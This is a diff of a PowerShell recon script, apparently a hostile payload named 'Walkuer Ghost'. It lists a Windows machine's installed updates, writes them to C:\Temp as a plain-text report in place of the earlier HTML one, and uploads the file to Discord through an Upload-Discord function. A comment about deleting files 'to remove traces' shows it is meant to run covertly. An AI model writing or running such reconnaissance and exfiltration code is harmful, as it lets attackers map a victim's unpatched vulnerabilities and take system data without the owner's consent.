@@ -17,15 +17,17 @@ cd \temp
 $userDir = "C:\Temp"
 $fileSaveDir = New-Item -Path $userDir -ItemType Directory -Force
 $date = Get-Date
-$style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
-$Report = ConvertTo-Html -Title 'Recon Report' -Head $style
-$Report = $Report + "<div id=body><h1>Walkuer Ghost Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>"
-$Report = $Report + '<div id=center><h3> Installed Updates</h3>'
-$Report = $Report + (Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | Sort-Object -Property InstalledOn -Descending | ConvertTo-Html Description, HotFixId, InstalledOn, InstalledBy)
-$Report = $Report + '</div>'
-$Report | Out-File -FilePath "$userDir\WinUpdates.html" -Encoding utf8
+$Report = "Update Report`r`n`r`nGenerated on: $Date`r`n`r`nInstalled Updates:`r`n"
 
-Upload-Discord -file "C:\temp\WinUpdates.html" -text "Updates Informations :"
+$UpdatesInfo = Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | Sort-Object -Property InstalledOn -Descending
+foreach ($Update in $UpdatesInfo) {
+    $Report += "Description: $($Update.Description)`r`nHotFixId: $($Update.HotFixId)`r`nInstalledOn: $($Update.InstalledOn)`r`nInstalledBy: $($Update.InstalledBy)`r`n`r`n"
+}
+
+$Report | Out-File -FilePath "$userDir\WinUpdates.txt" -Encoding utf8
+
+
+Upload-Discord -file "C:\temp\WinUpdates.txt" -text "Updates Informations :"
 #Removing every file to remove traces
 #rmdir -R \temp
 }
